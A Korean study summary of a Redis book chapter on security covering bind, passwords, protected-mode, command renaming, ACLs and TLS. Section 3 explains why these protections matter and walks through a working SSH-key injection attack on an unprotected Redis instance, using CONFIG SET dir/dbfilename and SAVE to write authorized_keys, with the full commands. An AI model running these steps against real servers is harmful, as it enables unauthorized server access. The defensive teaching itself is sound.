# 개발자를 위한 레디스 11장 학습 정리

레디스의 보안 기능을 다룬 챕터다. 책 329–357쪽이 범위다.

8~10장이 복제, 센티널, 클러스터로 "장애에도 죽지 않고 확장되는" 가용성과 확장성을 다뤘다면, 11장은 "아무나 접근하지 못하게 막는" 보안을 다룬다. 레디스를 캐시로 쓰면 원본 관계형 데이터베이스의 데이터를 임시로 들고 있는 것이고, 메시징 시스템으로 쓰면 서비스 데이터의 중간 전달자가 된다. 어느 쪽이든 신뢰할 수 없는 사용자가 레디스에 붙으면 원본 DB에 접근하는 것과 같은 효력을 갖기 때문에, 레디스의 데이터는 그만큼 안전하게 관리돼야 한다. 보안 기능은 크게 **커넥션 제어 → 커맨드 제어 → ACL(유저 기반 권한) → SSL/TLS(전송 암호화)** 순으로 발전해 왔다.

## 1. 커넥션 제어

가장 바깥쪽 방어선은 "누가 어떤 경로로 붙을 수 있는가"를 통제하는 것이다.

**bind.** 레디스가 실행되는 서버는 여러 개의 네트워크 인터페이스(여러 IP)를 가질 수 있다. `bind`는 그중 어떤 IP로 들어오는 연결을 받아들일지 지정한다. 기본값은 루프백 주소인 `127.0.0.1`이라, 변경하지 않으면 같은 서버 내부에서의 연결만 허용한다. 외부에서 접근해야 하면 서버를 가리키는 유효한 IP를 명시한다.

```
bind 10.0.0.2 127.0.0.1
```

위처럼 설정하면 `10.0.0.2`와 로컬 `127.0.0.1`로 들어오는 연결만 정상 처리되고, 그 외 IP로의 접근은 거부된다. `bind`를 주석 처리하거나 `0.0.0.0` 또는 `*`로 두면 서버가 가진 모든 IP의 연결을 받는데, 운영 인스턴스가 인터넷에 노출되는 경우 의도치 않은 연결을 막기 위해 특정 IP로 묶는 것이 권장된다.

**패스워드.** 패스워드를 거는 방법은 두 가지다. 예전 방식인 `requirepass`(노드에 패스워드 하나를 직접 지정)와, 버전 6.0에서 추가된 ACL이다. 버전 6부터는 ACL이 권장되지만 기존 방식도 여전히 동작한다.

```
127.0.0.1:6379> CONFIG SET requirepass password
OK
```

패스워드는 `redis.conf`에 적어두거나 위처럼 운영 중 `CONFIG SET`으로 바꿀 수 있다. 패스워드가 걸린 노드에는 접속 시 `-a` 옵션으로 직접 넣거나, 접속 후 `AUTH` 커맨드로 인증한다. 인증 전에는 어떤 커맨드도 쓸 수 없다.

```
127.0.0.1:6379> PING
(error) NOAUTH Authentication required.
127.0.0.1:6379> AUTH password
OK
127.0.0.1:6379> PING
PONG
```

`-a`로 커맨드라인에 패스워드를 직접 넣으면 안전하지 않을 수 있다는 경고가 뜨는데, `--no-auth-warning` 옵션으로 끌 수 있다.

**Protected mode.** `protected-mode`는 직접 기능을 바꾸진 않고 다른 설정값을 제어하는 안전장치다. 값이 `yes`(기본값)인 상태에서 **패스워드가 설정돼 있지 않으면**, `bind`로 외부 인터페이스를 허용했더라도 레디스는 `127.0.0.1` 로컬 연결만 받는다. 따라서 패스워드 없이 외부 접근을 허용하려면 `protected-mode`를 명시적으로 `no`로 바꿔야 한다. 바꿔 말하면, 처음 설치하고 패스워드를 안 걸었다면 로컬 연결만 가능한 상태로 시작한다.

## 2. 커맨드 제어

접근을 허용한 뒤에는 "어떤 커맨드를 쓸 수 있는가"를 제어한다. 레디스는 커맨드만으로 인스턴스의 중요한 설정을 바꿀 수 있어(`CONFIG GET`/`CONFIG SET`), 편리한 만큼 위험하다. 예를 들어 허용되지 않은 사용자가 `CONFIG SET dir <경로>`로 저장 경로를 바꾸고 `BGSAVE`로 데이터를 저장하면, 레디스 데이터를 원하는 위치에 떨궈놓을 수 있다.

**커맨드 이름 변경.** `rename-command`로 특정 커맨드를 다른 이름으로 바꾸거나 비활성화한다. 이 설정은 `redis.conf`에서만 바꿀 수 있고 실행 중에는 `CONFIG`로 변경할 수 없다.

```
rename-command CONFIG CONFIG_NEW   # CONFIG를 CONFIG_NEW로 변경
rename-command CONFIG ""           # 빈 문자열로 두면 비활성화
```

이름을 바꾸면 변경된 이름을 모르는 사용자는 그 커맨드를 못 쓴다. 단 **센티널을 쓴다면 주의**해야 한다. 센티널은 마스터 장애 시 레디스로 `REPLICAOF`, `CONFIG` 같은 커맨드를 직접 날려 제어하는데, `redis.conf`에서 커맨드 이름을 바꿔놓고 `sentinel.conf`에 반영하지 않으면 장애 상황에서 센티널이 보낸 커맨드를 레디스가 수행하지 못해 페일오버가 깨진다. 그래서 양쪽을 함께 바꿔야 한다.

```
# redis.conf
rename-command CONFIG   "my_config"
rename-command SHUTDOWN "my_shutdown"

# sentinel.conf
sentinel rename-command mymaster CONFIG   my_config
sentinel rename-command mymaster SHUTDOWN my_shutdown
```

**커맨드 실행 환경 제어.** 버전 7부터는 실행 중 바꾸면 위험한 커맨드를 어떤 환경에서 허용할지 고를 수 있다. 세 옵션 모두 기본이 `no`다.

```
enable-protected-configs no   # dir, dbfilename 등 보호 설정을 CONFIG로 수정 차단
enable-debug-command      no   # DEBUG 커맨드 차단
enable-module-command     no   # MODULE 커맨드 차단
```

각 값은 세 단계로 줄 수 있다.

| 값 | 의미 |
|---|---|
| `no` | 모든 연결에서 해당 커맨드 차단 |
| `yes` | 모든 연결에서 허용 |
| `local` | 로컬 연결(`127.0.0.1`)에서만 허용 |

`DEBUG`는 디버깅용, `MODULE`은 검증되지 않은 모듈을 끌어올 수 있어 잠재적으로 위험하므로, 운영에서는 `local`이나 `no`로 두는 것이 좋다.

## 3. 보안이 취약한 레디스의 해킹 시나리오

왜 이런 옵션들이 필요한지는, 패스워드 없이 외부에 열린 레디스가 어떻게 서버 침투의 발판이 되는지 보면 분명해진다. 책은 **레디스를 경유한 SSH 키 주입**을 예로 든다. 공격 대상 서버 A는 `protected-mode no`, 패스워드 없음, 6379 포트가 외부에 열린 상태다.

1. 공격자(서버 B)가 telnet으로 A의 6379 포트에 붙어 네트워크 통신과 무인증 접근이 가능함을 확인한다.
2. 서버 B에서 SSH 키 쌍을 생성하고(`ssh-keygen`), 공개키 앞뒤에 빈 줄을 넣은 텍스트 파일을 만든다. 빈 줄은 뒤에서 RDB 파일에 섞여 들어갈 잡음과 공개키를 줄 단위로 분리하기 위한 것이다.
3. A의 레디스를 비운 뒤(`FLUSHALL`), 공개키 텍스트를 하나의 키 값으로 밀어넣는다.

```
[serverB]$ cat key.txt | redis-cli -h 203.0.113.1 -x set key
```

4. A의 레디스에 붙어 저장 경로와 파일명을 SSH 디렉터리의 `authorized_keys`로 바꾸고 저장한다.

```
203.0.113.1:6379> CONFIG SET dir /home/centos/.ssh/
203.0.113.1:6379> CONFIG SET dbfilename authorized_keys
203.0.113.1:6379> SAVE
```

5. 이제 `/home/centos/.ssh/authorized_keys`에 공개키가 포함된 RDB 파일이 만들어졌으므로, 서버 B는 자기 개인키로 A에 SSH 접속할 수 있다.

```
[serverB]$ ssh -i id_rsa centos@203.0.113.1
[serverA]$
```

SSH 키를 직접 복사하지 않고 레디스를 우회 통로로 삼아 간접 전달한 것이 핵심이다. 그래서 `protected-mode yes` + 패스워드 설정이 권장되고, 패스워드 없이 쓸 수밖에 없다면 `enable-protected-configs`를 `local`이나 `no`로 둬서 외부에서 `dir`, `dbfilename` 같은 핵심 설정을 못 바꾸게 막아야 한다.

## 4. ACL: 유저 기반 접근 제어

버전 6 이전에는 유저 개념이 없어서, 패스워드만 알면 모든 커맨드를 쓰고 전체 키에 접근할 수 있었다. `FLUSHALL`로 데이터를 날리거나, `REPLICAOF`로 복제 설정을 바꾸거나, `SHUTDOWN`으로 종료시키는 것을 막을 방법이 없었다. `rename-command`로 위험한 커맨드를 가릴 수는 있었지만, 바뀐 이름이 노출되면 우회가 가능해 권한 제어의 근본 해법은 아니었다.

버전 6에서 도입된 **ACL(Access Control List)**은 유저라는 개념을 들여와, 유저별로 실행 가능한 커맨드와 접근 가능한 키와 채널을 제한한다. ACL 규칙은 한 줄에 여러 권한을 나열하는 형태이며, **항상 왼쪽에서 오른쪽 순서로 적용**되므로 권한을 적는 순서가 중요하다.

```
ACL SETUSER garimoo on >password ~cached:* &* +@all -@dangerous
#            └유저명  └상태 └패스워드  └접근키   └채널 └커맨드 권한
```

이 한 줄은 "활성 상태(`on`)의 garimoo 유저를 만들고, 패스워드는 `password`, 접근 가능한 키는 `cached:` 프리픽스를 가진 키들, pub/sub 채널은 전체(`&*`), 커맨드는 위험 카테고리(`@dangerous`)를 뺀 전부(`+@all`)"라는 뜻이다.

## 5. ACL 유저 생성과 패스워드

**생성, 조회, 삭제.** `ACL SETUSER`로 만들고, `ACL GETUSER`로 한 유저를 자세히, `ACL LIST`로 전체 유저를, `ACL DELUSER`로 삭제한다.

```
ACL SETUSER garimoo on >password ~cached:* &* +@all -@dangerous
ACL GETUSER garimoo    # flags / passwords / commands / keys / channels / selectors 반환
ACL LIST               # 전체 유저 목록
ACL DELUSER garimoo
```

설치 직후 아무 유저도 만들지 않으면 `default` 유저가 존재하며, 모든 것이 열려 있는 상태다.

```
ACL LIST
1) "user default on nopass ~* &* +@all"
```

- 이름 `default`, 상태 `on`, 패스워드 없음(`nopass`)
- 접근 가능한 키 `~*`(전체), 채널 `&*`(전체), 커맨드 `+@all`(전체)

**유저 상태(on/off).** `on`이면 그 유저로 접근을 허용한다. 생성 시 `on`을 명시하지 않으면 기본으로 `off` 유저가 만들어지므로, 나중에 `ACL SETUSER <user> on`으로 켜줘야 한다. 이미 접속 중인 유저를 `off`로 바꿔도 그 연결은 끊기지 않고 유지된다.

**패스워드.** `>password`로 패스워드를 추가(1개 이상 가능), `<password`로 특정 패스워드를 삭제한다.

| 키워드 | 동작 |
|---|---|
| `>pw` / `<pw` | 패스워드 추가 / 삭제 |
| `nopass` | 패스워드 없이 접근 허용(기존 패스워드는 모두 삭제됨) |
| `resetpass` | 저장된 패스워드를 모두 삭제하고 `nopass`도 해제 → 다시 설정 전까지 접근 불가 |

**패스워드 저장 방식.** 기존 `requirepass`는 패스워드를 평문으로 저장해서, 설정 파일에 접근하거나 `CONFIG GET requirepass`만 하면 누구나 값을 볼 수 있었다. 반면 ACL은 패스워드를 내부적으로 **SHA256 해시**로 저장하므로 `ACL GETUSER`로도 원본 패스워드를 바로 알 수 없다. 복잡한 패스워드가 필요하면 `ACL GENPASS`로 난수를 생성할 수 있다.

```
ACL GETUSER user:100
3) "passwords"
4) 1) "<sha256-hash>"      # 평문이 아닌 SHA256 해시로 저장됨

ACL GENPASS               # 안전한 난수 문자열 생성
```

## 6. ACL 커맨드 권한 제어

ACL의 핵심은 커맨드 권한이다. 일부 커맨드는 카테고리로 묶여 있어, 운영자가 커맨드를 일일이 지정하지 않아도 된다. 개별 커맨드나 서브 커맨드 단위 제어도 가능하다.

| 표기 | 의미 |
|---|---|
| `+@all` / `allcommands` | 모든 커맨드 허용 |
| `-@all` / `nocommands` | 모든 커맨드 차단(권한 언급 없이 유저를 만들면 이 상태) |
| `+@<category>` / `-@<category>` | 카테고리 단위 추가 / 제외 |
| `+<command>` / `-<command>` | 개별 커맨드 추가 / 제외 |
| `+<command>|<subcommand>` | 특정 서브 커맨드만 추가 |

규칙이 왼쪽부터 적용된다는 점이 여기서 특히 중요하다.

```
ACL SETUSER user1 +@all -@admin +bgsave +slowlog|get
```

이 줄은 ① 모든 커맨드를 주고 → ② `admin` 카테고리를 빼고 → ③ `bgsave`와 `slowlog`의 `get` 서브 커맨드만 다시 추가한다. 순서가 바뀌면 결과가 달라진다.

`ACL CAT`으로 미리 정의된 카테고리 목록을, `ACL CAT <카테고리명>`으로 그 안의 상세 커맨드를 확인한다. 카테고리는 `keyspace`, `read`, `write`, `set`, `list`, `hash`, `string`, `pubsub`, `admin`, `fast`, `slow`, `dangerous`, `connection`, `transaction`, `scripting` 등이 있다. 운영에서 자주 쓰는 몇 가지는 다음과 같다.

| 카테고리 | 내용 |
|---|---|
| `dangerous` | 아무나 쓰면 위험한 커맨드. 구성 변경(`replicaof`, `migrate`, `failover`), 장애 유발(`sort`, `flushdb`, `flushall`, `keys`), 운영 커맨드(`shutdown`, `monitor`, `acl`, `bgsave`, `info`, `config`, `debug`, `cluster`, `client` 등) |
| `admin` | `dangerous`에서 운영과 구성 변경 커맨드를 뺀, "잘 모르고 쓰면 장애를 부르는" 커맨드(`keys`, `sort`, `flushall` 등) |
| `fast` | O(1)로 수행되는 커맨드(`get`, `spop`, `hset` 등) |
| `slow` | `fast`에 속하지 않는 커맨드(`scan`, `set`, `setbit`, `sunion` 등) |
| `keyspace` | 키 자체를 다루는 커맨드(`scan`, `keys`, `rename`, `type`, `expire`, `exists` 등) |
| `read` / `write` | 자료구조별 읽기 전용 / 쓰기 커맨드 |

`dangerous`와 `admin`의 차이가 실무에서 유용하다. 운영팀이 따로 있고 개발자에게 레디스를 내줄 때, `dangerous`만 막으면 의도치 않은 장애를 크게 줄일 수 있다. 반대로 개발용 인스턴스라면 `keys`, `sort`, `flushall` 같은 커맨드는 쓰게 두고 싶을 수 있는데, 이때는 `admin`만 제외하면 된다.

## 7. ACL 키와 채널 접근 제어, 셀렉터

**키 접근.** `~*`(또는 `allkeys`)는 전체 키, `~<pattern>`은 패턴에 맞는 키만 허용한다. 예를 들어 `~mail:*`은 `mail:`로 시작하는 키에만 접근을 준다. 버전 7부터는 읽기와 쓰기 권한을 나눠 줄 수 있다.

| 표기 | 의미 |
|---|---|
| `~<pattern>` / `%RW~<pattern>` | 해당 패턴 키에 읽기와 쓰기 모두 허용(둘은 동일) |
| `%R~<pattern>` | 읽기 권한만 |
| `%W~<pattern>` | 쓰기 권한만 |
| `resetkeys` | 부여된 키 접근 권한을 모두 초기화 |

```
ACL SETUSER loguser ~log:* %R~mail:* %R~sms:*
# log: 키는 읽기/쓰기, mail:, sms: 키는 읽기만 허용
```

**셀렉터(selector).** 버전 7에서 추가된 개념으로, 더 유연한 규칙을 괄호로 묶어 표현한다. 위 `loguser`는 `mail:*`에 읽기 권한이 있어 `TTL` 같은 메타데이터 조회도 가능한데, "`mail:*`에는 오직 `GET`만 허용"하도록 좁히고 싶다면 셀렉터를 쓴다.

```
ACL SETUSER loguser resetkeys ~log:* (+GET ~mail:*)
#                                     └──── 셀렉터 ────┘
```

괄호 안이 셀렉터다. 키를 모두 리셋한 뒤 `log:`에는 모든 접근을, `mail:`에는 `GET`만 허용한다는 뜻이다. 이후 `loguser`가 `mail:1`에 `TTL`을 시도하면 `NOPERM` 오류가 난다.

**pub/sub 채널 접근.** `&<pattern>`으로 채널 접근을 제어한다. `&*`(또는 `allchannels`)는 전체 채널, `resetchannels`는 어떤 채널에도 발행하거나 구독할 수 없음을 뜻한다. 유저를 생성하면 기본으로 `resetchannels`가 부여돼, 명시하지 않는 한 채널 접근이 막혀 있다.

**유저 초기화.** `reset` 커맨드는 한 유저의 모든 권한을 회수해 `resetpass`, `resetkeys`, `resetchannels`, `off`, `-@all` 상태로 되돌린다. 즉 `ACL SETUSER`를 갓 실행한 직후와 같아진다.

## 8. ACL 규칙 파일 관리

ACL 규칙은 기본적으로 일반 설정 파일인 `redis.conf`에 함께 저장되지만, 유저 정보만 따로 담는 별도 ACL 파일로 관리할 수도 있다.

```
aclfile /etc/redis/users.acl
```

저장 형태는 어디에 두든 동일하고 위치만 달라진다. 운영 측면의 차이는 다음과 같다.

- **ACL 파일을 안 쓸 때**: `CONFIG REWRITE`로 모든 설정값과 ACL 룰을 한꺼번에 `redis.conf`에 저장한다.
- **별도 ACL 파일을 쓸 때**: `ACL LOAD`/`ACL SAVE`로 유저 데이터를 따로 로드하거나 저장할 수 있어 운영이 더 유연하다. 단 이 경우 `CONFIG REWRITE`를 해도 **ACL 정보는 저장되지 않는다**는 점에 유의해야 한다.

## 9. SSL/TLS 암호화 통신

지금까지가 "누가 무엇을 할 수 있는가"였다면, SSL/TLS는 "전송 중인 데이터를 어떻게 보호하는가"다. 레디스는 버전 6부터 SSL/TLS 보안 연결을 지원한다.

**SSL/TLS란.** SSL(Secure Sockets Layer)은 1995년 등장한 인터넷 보안 프로토콜이고, TLS(Transport Layer Security)는 그것이 발전한 현행 표준이다. SSL은 1996년 이후 업데이트되지 않았고 지금은 더 안전한 TLS를 쓰지만, 관행적으로 두 용어를 혼용해 `SSL/TLS`로 표기한다. TLS 1.0/1.1은 안전하지 않다고 여겨지며 1.2 이상이 권장된다. 이 프로토콜은 핸드셰이크 과정에서 상호 인증과 암호화를 수행해, 전송 중 데이터가 노출(기밀성)되거나 조작(무결성)되는 것을 막는다. 레디스는 평문으로 데이터를 빠르게 주고받기 때문에, 클라우드나 원격 환경에서는 감청과 조작 위험을 줄이기 위해 SSL/TLS가 사실상 필수가 된다.

**사용 설정.** 기본적으로 비활성화돼 있으며, 쓰려면 **빌드 시점부터** TLS를 켜야 한다.

```
make BUILD_TLS=yes
```

그다음 `redis.conf`에 TLS 포트와 인증 파일들을 정의한다. 레디스 인스턴스와 클라이언트는 보통 동일한 인증서를 쓰므로, 같은 `key`/`cert`/`ca-cert` 파일을 클라이언트에도 복사해둬야 한다.

```
tls-port <포트 번호>
tls-cert-file    /path/to/redis.crt
tls-key-file     /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```

기본 `port`와 `tls-port`를 함께 지정하면 두 종류의 연결을 모두 받는다. 예를 들어 `port 6379`, `tls-port 16379`면 6379는 평문, 16379는 TLS 통신이 된다. 인증서 없이는 아예 못 붙게 하려면 `port 0`으로 기본 포트를 비활성화한다. `redis-cli`나 애플리케이션(예: Python `redis.Redis(..., ssl=True, ssl_certfile=..., ssl_keyfile=..., ssl_ca_certs=...)`)에서 접속할 때도 인스턴스와 동일한 인증서를 제시해야 한다.

**HA 구성에서의 TLS.** 복제, 센티널, 클러스터에서 TLS를 쓰려면 각 구성에 맞는 옵션을 추가한다.

| 구성 | 추가 옵션 | 설명 |
|---|---|---|
| 복제 | `tls-replication yes` | 기본값 `no`에서는 복제본→마스터 연결이 평문이라 복제가 안 됨. `yes`여야 복제 연결도 TLS 사용 |
| 센티널 | `tls-replication yes` | `sentinel.conf`에 TLS 포트와 인증서, 복제 옵션을 함께 추가 |
| 클러스터 | `tls-cluster yes` | 모든 노드 간 연결과 클러스터 버스 통신이 TLS로 보호됨 |

복제본 쪽에서 `tls-replication`이 `no`인 채로 TLS 마스터에 붙으려 하면, 마스터는 `SSL routines ... unknown protocol` 류의 핸드셰이크 오류 로그를 남기고 복제가 구성되지 않는다.

## 헷갈리기 쉬운 지점

- **protected-mode는 패스워드가 없을 때만 발동한다.** `yes`라도 패스워드가 설정돼 있으면 `bind`로 연 외부 연결을 그대로 받는다. "패스워드 미설정 + 외부 노출"이라는 위험 조합일 때만 로컬로 묶어 보호한다.
- **rename-command는 redis.conf 전용, 실행 중 변경 불가.** `CONFIG SET`으로는 못 바꾼다. 게다가 센티널을 쓴다면 `sentinel.conf`에도 같은 변경을 해줘야 페일오버가 깨지지 않는다.
- **ACL 규칙은 왼쪽→오른쪽 순서로 적용된다.** `+@all -@admin +bgsave`처럼 순서에 따라 최종 권한이 달라진다. 권한을 "더하고 빼는" 순서를 의식해야 한다.
- **dangerous ⊃ admin.** `admin`은 `dangerous`에서 구성 변경과 운영 커맨드를 뺀 부분집합이다. 개발자에게는 보통 `dangerous`를 막고, 더 풀어줄 땐 `admin`만 제외한다.
- **유저는 기본이 off + nocommands + resetchannels.** `ACL SETUSER`만 하고 끝내면 비활성, 무권한, 채널 차단 상태다. `on`, 커맨드, 채널 권한을 명시적으로 줘야 실제로 동작한다.
- **requirepass는 평문, ACL은 SHA256.** 같은 패스워드라도 저장 방식이 다르다. `CONFIG GET requirepass`로는 값이 그대로 보이지만, ACL 유저의 패스워드는 해시라 원본을 역산할 수 없다.
- **TLS는 빌드 타임 결정이다.** `make BUILD_TLS=yes`로 빌드해야 `tls-*` 설정이 의미를 갖는다. 또 복제/클러스터에서는 노드 간 연결까지 TLS로 묶으려면 `tls-replication`/`tls-cluster`를 따로 켜야 한다.

> 본문의 IP(`10.0.0.2`, `203.0.113.1` 등)와 포트(6379, 16379, 10379), 패스워드와 해시 예시는 책의 예제 구성값이다. ACL 카테고리에 속한 커맨드 목록과 SSL/TLS 권장 버전 같은 값은 레디스 버전에 따라 달라질 수 있으니 참고치로 본다.
